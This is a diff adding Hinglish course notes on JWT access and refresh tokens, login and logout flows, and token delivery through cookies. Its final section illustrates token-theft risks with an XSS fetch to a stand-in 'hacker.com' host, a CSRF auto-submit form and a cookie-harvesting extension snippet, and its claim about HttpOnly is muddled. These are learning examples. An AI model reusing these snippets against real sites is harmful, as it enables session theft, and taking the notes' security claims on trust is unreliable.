@@ -726,3 +726,201 @@ Basic set of operations that can be use to interact with server. Some methods
 - Collection banake kaam karte hai
 - Environment variable bana lo jaise ki maine url ka banaya because wo common hai har request mein
 - Folder structure banake use karna for professional use
+
+# Video 16 ( Tokens )
+
+- Difference between Access and Refresh tokens?
+    - Everything same with the difference in their expiry
+    - Access token kam validity while refresh token zyada validity
+    - **Access** Token: A **short-lived** credential used to access protected resources (like an API or a user's data). It is like a temporary key card that grants direct entry.
+    - **Refresh** Token: A **long-lived **credential used solely to obtain a new Access Token. It is like a permanent, secure voucher that you exchange for a new temporary key card when the old one expires.
+
+### Access Token
+
+- Primary Purpose: To grant direct access to protected resources.	
+- Lifespan: Short-lived (e.g., 1 hour).	
+- Security Risk: Lower. Its short validity limits the damage if stolen.	Higher. 
+- Frequency of Use: Used frequently Sent with every API request to a protected resource.
+
+
+- Primary Purpose: To obtain a new Access Token without re-authentication.
+- Lifespan: Long-lived (e.g., 7 days, 30 days).
+- Security Risk: Its long validity allows an attacker to get new Access Tokens repeatedly.
+- Frequency of Use: Used infrequently, only when a new Access Token is needed.
+
+
+### How they are used?
+
+- Login karte ho: Server ek Access Token (1 ghante ka) aur ek Refresh Token (7 din ka) deta hai.
+- Kaam chalta rahta hai: Har API call ke saath Access Token bhejte ho.
+- 1 Ghanta baad: Access Token invalid ho jata hai. Server bolta hai, "Bhai, yeh token mar gaya, naya lao."
+- Naya Token lena: App automatically server ko Refresh Token bhejegi aur kahegi, "Bhaiya, isko verify karo aur ek fresh Access Token de do."
+- Phir se kaam shuru: Naya Access Token milte hi, tumhari app phir se normal kaam karna shuru kar deti hai.
+
+
+## Login User Steps
+
+- req body se data lo
+- username or email se find karo user
+- password check karo
+- generate access and refresh token
+- send secure cookies
+
+### Notes
+
+- Jo hamne custom methods likhe hain jaise ki generate token
+- password matchi etc etc
+- Wo hame jo instance return karega mongoose usse access honge na ki Mongoose object se directly
+- Ex - User hamara model tha aur uske andar tumne helloWorld() function dala hai
+
+```jsx
+User.helloWorld() - galat
+
+const user=User.findOne('key') 
+user.helloWorld() ye work karega
+```
+
+- why user.save({validateBeforeSave: false}) not user.save()
+
+```jsx
+
+user.save() // Ye pehle check karega: 
+            // - Email sahi hai kya?
+            // - Password strong hai kya?
+            // - Saare required fields hain kya?
+            // Agar koi problem hai toh ERROR dega
+
+user.save({validateBeforeSave: false}) 
+// Ye seedha database mein save karega:
+// - Koi checking nahi karega
+// - Direct save karega
+// - Koi validation error nahi aayega
+```
+
+### Very Important Note
+
+```jsx
+
+1. Cookies Mein (Security & Convenience)
+
+.cookie('accessToken',accessToken,options)
+.cookie('refreshToken',refreshToken,options)
+
+
+- Automatic Storage: Browser automatically har request ke saath cookies bhejega
+- Security: HttpOnly, Secure flags se XSS attacks se bachata hai
+- Convenience: Client ko manually token store/attach karne ki zaroorat nahi
+
+2. JSON Response Mein (Flexibility)
+
+.json(
+    new ApiResponse(200,{
+        user: loggedInUser, accessToken, refreshToken
+    },"User Logged in Successfully")
+)
+
+Kyun?
+
+- Mobile Apps: Mobile apps cookies use nahi kar sakte, unko direct tokens chahiye
+- Different Clients: Koi client cookies nahi use karta (e.g., mobile, desktop apps)
+- Backup: Agar cookies clear ho jaaye, toh client paas tokens hain
+- Multiple Storage: Client choose kar sakta hai kahan store karna hai (localStorage, asyncStorage, etc.)
+
+3. User Data Bhi (Complete Information)
+
+user: loggedInUser
+
+Kyun?
+
+- Immediate Use: Client ko user data mil jaata hai, alag se API call ki zaroorat nahi
+- Better UX: Login ke baad directly user profile show kar sakte hain
+
+```
+
+### Logout user 
+
+- Ismein ek dikkat hai ki user kaunsa hai ye kaise pata chalega
+- To we create a custom middleware for this auth middleware
+- ismein // req main cookie kaise laga pa rhe?
+- // kyunki hamne app mein wo middleware dal diya hai cookie parse wala ( req aur res dono mein access hai)
+
+```jsx
+
+const token = req.cookies?.accessToken || req.header('Authorization')?.replace('Bearer ', '');
+// Ye Authorization wali line ek standard hai
+// Authorization (key) : Bearer {token_value} (value)
+// to ham 'Bearer ' ko hata rahe aur sirf token le rhe
+
+
+// ismein first wala to samjh gae hoge wo to hamne cookie mein dala hua tha isliye access kar pa rhe
+// Doosra wala mobile device aur aise device jinke pass cookie ka option ni hai
+// yaad karo login ke end main hamne json response bheja tha wo inhi devices ke liye hai
+
+```
+
+- Mujhe ek doubt aya the ki hamne jab login kiya tab cookie mein access aur refresh dono bheja lekin jab logout kiya tab accesstoken ka hi use kiya
+- Also hame ye pata hai ki refreshToken mil gya to dikkat ho sakti to ye sab security measures ke bawjood kaise issue a rha
+
+```jsx
+
+1. XSS (Cross-Site Scripting) Attack
+javascript
+// Agar app mein XSS vulnerability hai:
+// Attacker malicious script inject kar sakta hai:
+<script>
+fetch('https://hacker.com/steal', {
+    method: 'POST',
+    credentials: 'include' // ❌ Cookies automatically include honge
+});
+</script>
+
+// Browser automatically cookies bhej dega attacker ke server ko
+// HttpOnly bhi kaam nahi aayega kyunki browser automatically bhej raha hai
+2. CSRF (Cross-Site Request Forgery)
+javascript
+// Attacker fake form bana sakta hai:
+<form action="https://yourapp.com/delete-account" method="POST">
+    <input type="hidden" name="confirm" value="yes">
+</form>
+<script>document.forms[0].submit();</script>
+
+// Browser automatically cookies include karega
+// User ko pata bhi nahi chalega
+3. Man-in-the-Middle Attack
+javascript
+// Agar:
+// - User public WiFi use kar raha hai
+// - HTTPS properly implement nahi hai
+// - Certificate issues hain
+
+// Attacker network traffic intercept kar sakta hai:
+// Request: GET /api/user/profile
+// Headers: Cookie: accessToken=xxx; refreshToken=xxx ❌ Pakda gaya!
+4. Browser Extensions
+javascript
+// Malicious browser extension access kar sakta hai:
+chrome.cookies.getAll({}, function(cookies) {
+    cookies.forEach(function(cookie) {
+        // ❌ Har cookie including your tokens access ho sakta hai
+        sendToAttackerServer(cookie);
+    });
+});
+5. Physical Access
+javascript
+// Kisi ko physical access mil gaya computer ka:
+// - Browser developer tools open karke
+// - Copy cookies from Application tab
+// - Use stolen tokens from different machine
+6. Server-Side Vulnerabilities
+javascript
+// Agar server pe log files bana rahe hain:
+console.log('Request cookies:', req.cookies);
+// ❌ Log files mein tokens save ho sakte hain
+
+// Ya response mein accidentally expose:
+res.json({
+    user: user,
+    cookies: req.cookies // ❌ GALTI se cookies expose!
+});
+
+```
